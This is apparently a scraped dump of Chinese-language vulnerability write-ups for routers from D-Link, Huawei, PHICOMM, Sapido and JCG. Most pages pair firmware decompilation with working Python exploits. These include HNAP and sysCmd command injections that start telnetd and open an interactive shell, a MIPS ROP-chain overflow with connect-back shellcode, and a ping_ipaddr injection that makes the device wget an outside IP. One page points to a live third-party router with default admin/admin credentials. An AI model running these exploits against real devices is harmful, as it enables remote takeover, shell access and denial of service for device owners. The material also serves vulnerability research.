__format = \"sh %s%s.sh > /dev/console &\"; } //执行该脚本 //var_run变量对应的字符是\"/var/run/\" snprintf(acStack1708,0x100,__format,&var_run,operation); system(acStack1708); …… } 漏洞执行顺序 在上面的hnap_main代码中，代入本漏洞SetRouterSettings的情况，最后会执行sh /var/run/SetRouterSettings.sh，这个脚本是动态生成的，在模拟固件并执行poc成功之后查看内容（还没找到具体生成sh脚本的代码） #!/bin/sh echo \"[$0]-->RouterSettings Change\" > /dev/console event DBSAVE > /dev/console service HTTP.WAN-1 start > /dev/console #here！！！ xmldbc -s /runtime/hnap/dev_status '' > /dev/console HTTP.WAN-1是一种服务，对应于/etc/services/HTTP.WAN-1.php，该服务会开启IPT.WAN-1服务 /etc/services/IPT.WAN-1.php会执行之前所说的iptables命令 漏洞复现 import requests import telnetlib from hashlib import md5 import time import math trans_5C = \"\".join(chr(x ^ 0x5c) for x in xrange(256)) trans_36 = \"\".join(chr(x ^ 0x36) for x in xrange(256)) blocksize = md5().block_size def hmac_md5(key, msg): if len(key) > blocksize: key = md5(key).digest() key += chr(0) * (blocksize - len(key)) o_key_pad = key.translate(trans_5C) i_key_pad = key.translate(trans_36) return md5(o_key_pad + md5(i_key_pad + msg).digest()) def HNAP_AUTH(SOAPAction, privateKey): b = math.floor(int(time.time())) % 2000000000 b = str(b)[:-2] h = hmac_md5(privateKey, b + '\"http://purenetworks.com/HNAP1/' + SOAPAction + '\"').hexdigest().upper() return h + \" \" + b #输入IP和admin口令，通过读hnap_main的二进制，理解初始状态admin的口令为空（public_key_0：0代表空值） IP = '192.168.0.1' adminPw = '' command = \"telnetd\" # command injection id headers = requests.utils.default_headers() headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\" headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/Login\"' headers[\"Origin\"] = \"http://\" + IP headers[\"Referer\"] = \"http://\" + IP + \"/info/Login.html\" headers[\"Content-Type\"] = \"text/xml; charset=UTF-8\" headers[\"X-Requested-With\"] = \"XMLHttpRequest\" #构造一个action为request的请求发送给Login payload = 'requestAdmin' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) data = r.text #通过获取的publickey计算privatekey，根据privatekey计算口令的hmac(在上文中对应的是hmac_1) challenge = str(data[data.find(\"\") + 11: data.find(\"\")]) cookie = data[data.find(\"\") + 8: data.find(\"\")] publicKey = str(data[data.find(\"\") + 11: data.find(\"\")]) privateKey = hmac_md5(publicKey + adminPw, challenge).hexdigest().upper() password = hmac_md5(privateKey, challenge).hexdigest().upper() #构造action为login的请求，发送用户名和口令 headers[\"HNAP_AUTH\"] = HNAP_AUTH(\"Login\", privateKey) headers[\"Cookie\"] = \"uid=\" + cookie payload = 'loginAdmin'+password+'' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) #登录成功后访问SetRouterSettings设置路由器的一些配置，其中RemotePort被设置为command headers[\"Origin\"] = \"http://\" + IP headers[\"HNAP_AUTH\"] = HNAP_AUTH(\"SetRouterSettings\", privateKey) headers[\"SOAPaction\"] = '\"http://purenetworks.com/HNAP1/SetRouterSettings\"' headers[\"Accept\"] = \"text/xml\" payload = open('{}.xml'.format(\"CVE-2018-19986\")).read().replace('ip', IP).replace('COMMAND', command) print '[*] command injection' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print(r.text) print '[*] waiting 30 sec...' time.sleep(30) #利用成功之后，服务端已经开启了Telnet服务，攻击者可直接连服务器的Telnet print '[*] enjoy your shell' telnetlib.Telnet(IP).interact() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 18:08:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2018-20056.html":{"url":"iot/D-Link/CVE-2018-20056.html","title":"（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞","keywords":"","body":"（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞 一、漏洞简介 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备，在/bin/boa文件的formLanguage函数中存在缓冲区溢出漏洞，在调用sprintf函数时没有对参数的长度进行检查，导致远程攻击者可以通过访问 http://[ip]/goform/formLanguageChange并指定currTime参数实现远程代码执行。 固件下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/ 二、漏洞影响 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备。 三、复现过程 漏洞分析 在formLanguageChange函数中，通过websGetVar获取config.i18n_language，nextPage，currTime等参数。websGetVar通过malloc、memcpy将获取到的参数返回给formLanguageChange。formLanguageChange接下来调用了sprintf危险函数向local_f8变量中读入参数内容，并在下一步websRedirect使用了local_f8作为参数。 void formLanguageChange(undefined4 uParm1) { int iVar1; char *pcVar2; undefined4 uVar3; FILE *__stream; char *__s1; char local_f8 [200]; char acStack48 [24]; undefined4 local_18; int local_14; __s1 = (char *)websGetVar(uParm1,\"config.i18n_language\",&DAT_004ac874); …… apmib_set(0x129,&local_18); __s1 = (char *)websGetVar(uParm1,\"nextPage\",&DAT_004ac874); if (*__s1 == 0) { uVar3 = websGetVar(uParm1,\"currTime\",&DAT_004ac874);//获取currTime参数 __s1 = \"/index.asp\"; } else { …… } sprintf(local_f8,\"%s?t=%s\",__s1,uVar3);//危险函数sprintf直接读入字符 LAB_00460b34: websRedirect(uParm1,local_f8); …… return; } websRedirect主要调用send_r_moved_perm，这个函数调用了两次危险函数sprintf，分别向acStack224(sp+0x19f8-0xe0)和acStack480(sp+0x19f8-0x1e0)中输入字符。 undefined4 websRedirect(int iParm1,char *pcParm2) { char *pcVar1; *(undefined4 *)(iParm1 + 0x50) = 0; pcVar1 = strstr(pcParm2,\"/apply_setting.asp\"); if (pcVar1 != (char *)0x0) { apply_setting_redirect = apply_setting_redirect + 1; } send_r_moved_perm(iParm1,pcParm2); return 0; } void send_r_moved_perm(int iParm1,char *pcParm2) { undefined4 uVar1; char *pcVar2; undefined auStack6624 [6144]; char acStack480 [256]; char acStack224 [200]; …… if (pcVar2 == (char *)0x0) { if (*pcParm2 == '/') { pcParm2 = pcParm2 + 1; } sprintf(acStack224,\"http://%s/%s\",*(undefined4 *)(iParm1 + 0x70),pcParm2); pcParm2 = acStack224; } sprintf(acStack480, \"\\r\\n\\t\\tThis document has moved to a new location.\\r\\n\\t\\tPlease update your documents to reflect the newlocation.\\r\\n\\t\\t\\r\\n\" ,pcParm2); ……s return; } 通过第二两个sprintf修改返回地址，构造ROP链，导致程序控制流被劫持。（也可以通过两个sprintf的配合来实现栈的迁移，漏洞作者是这么实现的） 漏洞复现 poc import requests import sys import struct from pwn import * #context.log_level='debug' context.arch='mips' context.endian='big' ip='192.168.75.150' def syscmd1(a): p=remote(ip,80) z=len(a) print \"[+]len:\"+str(z) payload='' payload+='POST /goform/formLanguageChange HTTP/1.1\\r\\n' payload+='Host: '+ip+'\\r\\n' payload+='Connection: keep-alive\\r\\n' payload+='Accept-Encoding: gzip, deflate\\r\\n' payload+='Accept: */*\\r\\n' payload+='User-Agent: python-requests/2.18.4\\r\\n' payload+='Content-Length: '+str(z+9)+'\\r\\n' payload+='Content-Type: application/x-www-form-urlencoded\\r\\n' payload+='\\r\\n' payload+='currTime=' payload+=a+'\\r\\n' p.send(payload) p.recvuntil('') #raw_input() p.close() #base address of libc.so.0 base1=0x2ab88000 ###shellcode sc=struct.pack(\">I\",0x24060101) sc+=struct.pack(\">I\",0x04d0ffff) sc+=struct.pack(\">I\",0x2806ffff) sc+=struct.pack(\">I\",0x27bdffe0) sc+=struct.pack(\">I\",0x27e41001) sc+=struct.pack(\">I\",0x2484f023) sc+=struct.pack(\">I\",0xafa4ffe8) sc+=struct.pack(\">I\",0xafa0ffec) sc+=struct.pack(\">I\",0x27a5ffe8) sc+=struct.pack(\">I\",0x24020fab) sc+=struct.pack(\">I\",0xafa00108) sc+=struct.pack(\">I\",0x0101010c) sc+=\"/bin//sh\\x00\" shellcode ='' shellcode += asm(shellcraft.connect('192.168.75.149',5555)) shellcode += asm(shellcraft.dup2(5,0)) shellcode += asm(shellcraft.dup2(5,1)) shellcode += sc s0=struct.pack(\">I\",base1+0x2C794) s1=struct.pack(\">I\",base1+0x2C794)### rop2:move $t9,$s2;...;jr $t9 s2=struct.pack(\">I\",base1+0x24b70)### rop3:sleep(1) s3=struct.pack(\">I\",base1+0x2bdac)### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ra s4=struct.pack(\">I\",base1+0x2bdac) ###rop payload1='a'*0x167+s0+s1+s2+s3 payload1+=struct.pack(\">I\",base1+0x25714) ###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2 payload1+='b'*0x1c+s0+s1+s2+s3+s4 payload1+=struct.pack(\">I\",base1+0x5f98) ###rop4:lw $ra,0x1c($sp);...;jr $ra payload1+='c'*0x1c payload1+=s3 payload1+='d'*0x18 payload1+=struct.pack(\">I\",0x24910101) ###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9 payload1+=struct.pack(\">I\",0x2231feff) payload1+=struct.pack(\">I\",0x0220c821) payload1+=struct.pack(\">I\",0x0320f809) payload1+=struct.pack(\">I\",0x2231feff) payload1+=struct.pack(\">I\",0x2231feff) payload1+=struct.pack(\">I\",base1+0x2bda0) ###rop6:mov $t9,$a0;...;jalr $t9 payload1+='e'*0x20+shellcode if __name__ == \"__main__\": syscmd1(payload1) 利用效果: 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 17:57:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2018-20057.html":{"url":"iot/D-Link/CVE-2018-20057.html","title":"（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞","keywords":"","body":"（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞 一、漏洞简介 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备，在/bin/boa文件的formSysCmd函数存在后门，导致攻击者在身份认证后可以通过访问 http://[ip]//goform/formSysCmd并指定sysCmd参数，从而实现远程命令注入。 固件下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/ 本漏洞的路由器运行环境与CVE-2018-20056相同。 二、漏洞影响 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备。 三、复现过程 漏洞分析 查看ghidra中的反编译代码，在formSysCmd中，首先获取sysCmd参数，然后通过snprintf写入栈中变量，直接调用system函数执行该参数内容。 void formSysCmd(undefined4 uParm1) { undefined4 uVar1; char *pcVar2; char acStack120 [104]; uVar1 = websGetVar(uParm1,\"submit-url\",&DAT_004ac874); //获取post参数sysCmd，该参数可由用户控制 pcVar2 = (char *)websGetVar(uParm1,\"sysCmd\",&DAT_004ac874); if (*pcVar2 != 0) { //将sysCmd写入栈中，并调用system执行 snprintf(acStack120,100,\"%s 2>&1 > %s\",pcVar2,\"/tmp/syscmd.log\"); system(acStack120); } websRedirect(uParm1,uVar1); return; } 漏洞复现 该漏洞是在身份认证成功之后才可实现命令注入，需要先登录输入用户名和口令。由于是在qemu中模拟固件，通过apmib_get读取路由器本地配置无法实现，所以在劫持了apmib_get函数之后，login输入的用户名和密码暂时填为空。在真机上操作时，换成真实的用户名和密码即可。 import requests import sys import struct import base64 from pwn import * context(arch='mips',endian='big',log_level='debug') ip='192.168.84.129' port=101 def login(user,password): postData = { 'login_name':'', 'curTime':'1234', 'FILECODE':'', 'VER_CODE':'', 'VERIFICATION_CODE':'', 'login_n':user, 'login_pass':base64.b64encode(password), } response = requests.post('http://'+ip+'/goform/formLogin',data=postData) #print response.url def syscmd(cmd): postData = { 'sysCmd':cmd, 'submit-url':'1234', } response = requests.post('http://'+ip+'/goform/formSysCmd',data=postData) #print response.url def inter(): p=remote(ip,port) p.interactive() if __name__ == \"__main__\": login('','')#这里要写实际的用户名和密码，例如admin 12345 syscmd('telnetd -p '+str(port)) inter() 另由于qemu模拟时，/dev下没有pty设备，导致telnet连接不能实现，但是端口是已经打开了： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 18:01:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2019-7297.html":{"url":"iot/D-Link/CVE-2019-7297.html","title":"（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞","keywords":"","body":"（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞 一、漏洞简介 D-Link DIR 823G 1.02B03及之前的版本中存在命令注入漏洞，攻击者可通过发送带有shell元字符的特制/HNAP1请求利用该漏洞执行任意的操作系统命令。GetNetworkTomographyResult函数中调用system函数，执行的内容中包括不受信任的用户输入Address字段，攻击者可以远程执行任意命令。 二、漏洞影响 D-Link DIR 823G 1.02B03及之前的版本 三、复现过程 漏洞分析 漏洞原理中提到的GetNetworkTomographyResult函数是在goahead二进制文件中实现的。在function_list中找到对应的函数地址。 GetNetworkTomographyResult获取address，number，size参数，作为ping的参数。 ping address -c number -w number -s size > /tmp/ping.txt 2>>/tmp/ping.txt 但在system之前并没有对这些外来参数进行检查，如果address为;telnetd;就能启动Telnet服务。可以看出这些参数都是通过apmib_get获取的，那么在之前一定有apmib_set进行设置，在IDA中查找关键字0x1b72，0x1b73，0x1b73，定位到apmib_set的位置，结合ghidra的反汇编代码，确定在SetNetworkTomographySettings函数中可以对这些参数进行设置。 poc import requests from pwn import * IP='192.168.0.1' headers = requests.utils.default_headers() headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\" headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/SetNetworkTomographySettings\"' headers[\"Content-Type\"] = \"text/xml; charset=UTF-8\" headers[\"Accept\"]=\"*/*\" headers[\"Accept-Encoding\"]=\"gzip, deflate\" headers[\"Accept-Language\"]=\"zh-CN,zh;q=0.9,en;q=0.8\" payload = '\\ \\ \\ ;telnetd;\\ 4\\ 4\\ ' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print r.text headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/GetNetworkTomographyResult\"' payload = '\\ \\ \\ ' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print r.text p=remote(IP,23) p.interactive() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 16:39:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2019-7298.html":{"url":"iot/D-Link/CVE-2019-7298.html","title":"（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞","keywords":"","body":"（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞 一、漏洞简介 D-Link DIR 823G 1.02B03及之前的版本中存在命令注入漏洞，攻击者可通过发送带有shell元字符的特制/HNAP1请求利用该漏洞执行任意的操作系统命令。在HNAP API函数处理请求之前，system函数执行了不可信的命令，触发该漏洞。 二、漏洞影响 D-Link DIR 823G 1.02B03及之前的版本 三、复现过程 漏洞分析 在每次内核启动之后将启动init进程，init进程的启动时根据/etc/inittab这个文件赖在不同运行级别启动相应的进程或执行相应的操作。其中sysinit代表系统的初始化，只有系统开机或重新启动的时候，后面对应的process才会执行一次。 ::sysinit:/etc/init.d/rcS 在rcS中，先执行一些列mkdir和设置，执行了goahead。 goahead 是一个开源的 web 服务器，用户的定制性非常强。可以通过一些 goahead 的 api定义 url处理函数和可供 asp 文件中调用的函数，具体可以看看官方的代码示例和网上的一些教程。 goahead的websUrlHandlerDefine函数允许用户自定义不同url的处理函数： websUrlHandlerDefine(T(\"/HNAP1\"), NULL, 0, websHNAPHandler, 0); websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0); websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0); 以上代表/HNAP1的请求交给websHNAPHandler函数处理，/gofrom的请求交给websFormHandler函数处理，/cgi-bin的请求交websCgiHandler函数处理。这些处理函数有统一的参数： int (*fn)(webs_t wp, char_t *url, char_t *path, char_t *query) wp Web server connection handle. url Request URL. path Request path portion of the URL. query Query string portion of the URL. 先了解/HNAP1请求的处理函数，在goahead中查找“HNAP1”字符串并通过xref定位处理函数sub_42383c sub_4238c主要通过遍历全局的函数表来处理HNAP1接受的不同请求。function_list中每个元素的前四个字节为函数名，后四个字节为对应的函数地址。当找到在function_list中找到函数名与请求相同的字符串时，向/var/hnaplog中记录param_7的值，这个值但从汇编不太能看出，hackedbylh指出是post的报文，在运行过程中查看/var/hnaplog能猜出来。之后调用对应的函数地址处理相关请求。 这里无论处理请求的函数名是什么，在找到之后会通过snprintf输入字符且未做检查，之后直接system执行，存在命令注入漏洞。如果post请求是'/bin/telnetd'，就会先开启telnet服务器，再讲字符写入hnaplog。 另外需要注意，post的数据要加上引号，因为echo '%s' > /var/hnaplog中本身带了单引号，如果只是/bin/telnet，相当于 echo '`/bin/telnet`' > /var/hnaplog 由于命令由引号括起，会当做字符串处理，不会执行命令 而 echo ''`/bin/telnet`'' > /var/hnaplog post中的两个引号分别与自带的两个引号组合，反引号没有嵌套在单引号中，会当做命令执行。 poc import requests from pwn import * IP='192.168.0.1' command =\"'`/bin/telnetd`'\" length = len(command) headers = requests.utils.default_headers() headers[\"Content-Length\"]=str(length) headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\" headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/Login\"'#此处的Login可以替换为任何在function_list中的函数名 headers[\"Content-Type\"] = \"text/xml; charset=UTF-8\" headers[\"Accept\"]=\"*/*\" headers[\"Accept-Encoding\"]=\"gzip, deflate\" headers[\"Accept-Language\"]=\"zh-CN,zh;q=0.9,en;q=0.8\" payload = command r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print r.text p=remote(IP,23) p.interactive() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 16:37:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/1.html":{"url":"iot/D-Link/1.html","title":"（CVE-2019-13128）D-Link DIR-823G命令注入漏洞","keywords":"","body":"（CVE-2019-13128） D-Link DIR-823G 命令注入漏洞 影响版本 DIR823GA1_FW102B03 漏洞描述 这个问题存在于DIR823GA1固件FW102B03版本，网关(Gateway\")的选项设置静态路由(SetStaticRouterSettings)，IP地址选项(IPAddress\")，存在命令注入。 漏洞POC 选择IP地址(IPAddress)提交信息，在数据包修改。 如图所示。 原文地址:https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/DIR-823G-v2.pdf 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:54:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/2.html":{"url":"iot/D-Link/2.html","title":"（CVE-2019-15529）D-Link DIR-823G","keywords":"","body":"（CVE-2019-15529）D-Link DIR-823G 一、漏洞简介 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。 使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 二、漏洞影响 DIR823GA1_FW102B05 三、复现过程 1.下载D-Link DIR-823G固件，http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-823G 2.在固件版本为V1.0.2B05的D-Link DIR823G设备上存在一个问题，能偶通过用户名字段中注入命令进行登录。 3.攻击载荷 4.漏洞细节 5.写入文件 原文地址:https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/823G-102B05-1.pdf 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:53:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2019-16920.html":{"url":"iot/D-Link/CVE-2019-16920.html","title":"（CVE-2019-16920）D-Link rce","keywords":"","body":"（CVE-2019-16920）D-Link rce 一、漏洞简介 D-Link设备中出现未经身份验证的命令注入漏洞(FG-VD-19-117/CVE-2019-16920)，该漏洞可造成远程代码执行。 二、漏洞影响 DIR-655 ，DIR-866L，DIR-652，DHP-1565，DIR-855L，DAP-1533，DIR-862L，DIR-615，DIR-835，DIR-825等 三、复现过程 poc 攻击者可以利用该漏洞将任意字符串发送到“PingTest”网关接口来实现命令注入。 POST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234) “该漏洞始于一次错误的身份验证过程。当我们要进入管理页面时，需要执行登录操作。此时，我们会对apply_sec.cgi页面发出POST请求，其中包含一个操作ping_test。研究后发现，我们可通过参数ping_ipaddr执行命令注入。虽然响应是返回登录页面，但操作ping_test仍然执行了，我们通过参数ping_ipaddr注入的命令echo 1234成功执行，并将结果发送回我们的服务器。” 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 16:20:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/CVE-2019–20213.html":{"url":"iot/D-Link/CVE-2019–20213.html","title":"（CVE-2019–20213）D-Link DIR-859 rce","keywords":"","body":"（CVE-2019–20213）D-Link DIR-859 rce 一、漏洞简介 二、漏洞影响 三、复现过程 import requests # Miguel Mendez Z. FILES = [\"vpnconfig.php\"] IP = \"192.168.0.1\" PORT = \"80\" headers = {'content-type': 'application/x-www-form-urlencoded'} print \"\\n-----------VPN-------------\\n\" url_vpn = 'http://{ip}:{port}/{file1}?pwnd=%0a'.format(ip=IP, port=PORT, file1=FILES[0]) print(requests.get(url_vpn).text) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-09 23:44:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Huawei/CVE-2016-6158.html":{"url":"iot/Huawei/CVE-2016-6158.html","title":"（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞","keywords":"","body":"（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞 一、漏洞简介 HuaweiWS331a是中国华为（Huawei）公司的一款迷你无线路由器。使用WS331a-10V100R001C01B112之前版本软件的HuaweiWS331a路由器的管理界面存在跨站请求伪造漏洞。远程攻击者可通过提交特制的请求利用该漏洞恢复出厂设置或重启设备。 二、漏洞影响 WS331a-10 V100R001C02B017SP01及之前版本 三、复现过程 POC实现代码如下： 当管理员登陆后，打开如下poc页面，WS331a设备将重启。 document.forms[0].submit(); 当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。 document.forms[0].submit(); 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-06 17:36:41 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/JCG/1.html":{"url":"iot/JCG/1.html","title":"JCG路由器命令执行漏洞","keywords":"","body":"漏洞标题 JCG路由器命令执行漏洞 漏洞环境 漏洞复现 Shandan上搜到相关信息 选择一个测试：http://216.171.4.173/home.asp 默认密码：admin/admin 在系统工具中可执行命令 如图 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-25 23:45:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/PHICOMM/1.html":{"url":"iot/PHICOMM/1.html","title":"（CVE-2019-19117）PHICOMM 远程代码执行","keywords":"","body":"（CVE-2019-19117）PHICOMM 远程代码执行 一、漏洞简介 通过修改HTTP post请求中的内容，在根shell上远程执行命令。 二、漏洞影响 PHICOMM K2(PSG1218) V22.5.9.163 三、复现过程 受影响的源代码文件：/usr/lib/lua/luci/controller/admin/autoupgrade.lua 受影响的函数：save（） 漏洞详情 首先，在通过Web登录身份验证，会话劫持漏洞或弱凭据破解攻击以获取访问权限后，向设备发送精心制作的数据包 curl -i -s -k -v -X'POST' -e \"http://192.168.2.1/cgi-bin/luci/;stok=xxx/xxx/xxx/xxx\" -b \"sysauth=4a2c4bdba5fb1273ce62759fd42dba42\" --data-binary \"mode=1&autoUpTime=02%3A05|reboot\" 'http://192.168.2.1/cgi-bin/luci/;stok=xxx/admin/xxx/xxx/xxx' 在此http数据包中，我们将要执行“重新引导”的命令添加到数据包内容中。 我们可以看到，将'autoUpTime'的值直接分配给变量，而无需检查该值是否被恶意修改，然后发送给服务器。 然后，服务器直接将数据附加到命令，而无需检查数据是否也被恶意修改，从而使攻击者想要执行的命令附加到该命令。 最后，路由器将执行命令“ reboot”，这将导致DoS。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-24 13:28:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Sapido/Sapido多款路由器命令执行漏洞.html":{"url":"iot/Sapido/Sapido多款路由器命令执行漏洞.html","title":"Sapido多款路由器命令执行漏洞&突破","keywords":"","body":"Sapido多款路由器命令执行漏洞&突破 一、漏洞简介 二、漏洞影响 BR270n-v2.1.03 BRC76n-v2.1.03 GR297-v2.1.3 RB1732-v2.0.43 之前的版本存在命令执行漏洞 三、复现过程 0x01 固件环境模拟 0x02 binwalk解压固件 0x03 查看web容器 对于嵌入式设备而言，很多服务都是移植开源的，/etc/init.d文件夹下是路由器启动时的加载项，在这些文件中可以看到很多的启动服务等，但是在这里我没有发现web容器的启动项，猜测可能厂商进行了二次开发 0x04 查找http服务模块 在这里可以看到很多关于http的，我们不去关注web网页出现的。因为我们想要知道这款路由器的web容器是其中，所以我们把重点放在前面的elf文件处，在这里我们看到一个cm的elf文件，如果知道开源的web服务器boa可能猜到一些，下面就是boa的架构 可以这里清晰的看到web层的英文如何状语从句：底层通过boa进行交互的。那么对于不知道的容器我们又该如何去分析呢？继续我们去分析剩下的elf程序，名字通过逐个状语从句：我们分析在sysconf程序中发现了http请求的处理方式，使用ghidra来分析sysconf 通过全文搜索定位http到关键函数，在这里我们发现了一个关键的函数apmib_get通过猜测也能大概猜到这是一个关于获取的函数，通过google可以搜索到这个函数，会发现这个函数是关于web开源服务器的boa用到的函数，到那么这里我们就已经确认这款路由器的web容器的英文boa了。既然已经知道了boa，肯定那么这个知道有框架一个关键的文件syscmd.htm文件，可以执行系统命令，由于但是这款路由器的英文asp写的所以我们只进行检索syscmd 这里可以发现两个文件，一个elf文件，一个asp文件，打开asp文件 在这里可以抛光页面可以执行系统命令 0x05 通过url访问指定页面 发现可以执行系统命令，那么这里又是如何处理的呢？ 通过上面的asp文件可以知道，对于输入的命令处理应该和formSysCmd有关联，这里我们进行grep搜索 可以看到一个webs的elf文件，那么可以猜测这里可能就是syscmd执行的临时文件了 0x06 分析webs文件 上面就是整个命令执行的逐步实现方式了，第一个图片可以看到使用system函数执行输入的系统命令，第二个图片可以裁剪将执行的结果通过cat输入到/web/obama.dat文件中，最后将obama.dat中的内容输入到web界面的文本框里。 0x07 poc # Exploit Title: SAPIDO RB-1732 command line execution # Date: 2019-6-24 # Exploit Author: k1nm3n.aotoi # Vendor Homepage: http://www.sapido.com.tw/ # Software Link: http://www.sapido.com.tw/CH/data/Download/firmware/rb1732/tc/RB-1732_TC_v2.0.43.bin # Version: RB-1732 V2.0.43 # Tested on: linux import requests import sys def test_httpcommand(ip, command): my_data = {'sysCmd': command, 'apply': 'Apply', 'submit-url':'/syscmd.asp', 'msg':''} r = requests.post('http://%s/goform/formSysCmd' % ip, data = my_data) content = r.text content = content[ content.find('')+56: content.rfind('')] return content print test_httpcommand(sys.argv[1], \" \".join(sys.argv[2:])) 0x08 运行截图 0x09 BR270n-v2.1.03命令执行突破 这个原理和RB1732差不多，只不过访问的页面变成了syscmd.htm了 0x010 BRC76n-v2.1.03命令执行漏洞 0x011 GR297-v2.1.3命令执行漏洞 0x012 总结 